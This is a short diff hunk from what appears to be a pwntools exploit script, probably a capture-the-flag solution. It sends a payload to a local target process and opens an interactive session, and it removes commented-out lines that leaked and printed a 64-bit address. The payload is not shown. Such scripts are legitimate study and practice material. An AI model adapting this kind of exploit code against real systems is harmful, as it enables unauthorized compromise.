@@ -85,7 +85,4 @@ p = process(target)
 
 p.recvuntil("\n")
 p.sendline(payload)
-# received = p.recvline().rstrip()
-# leaked = u64(received.ljust(8, b"\x00"))
-# print("leaked: " + hex(leaked))
 p.interactive()
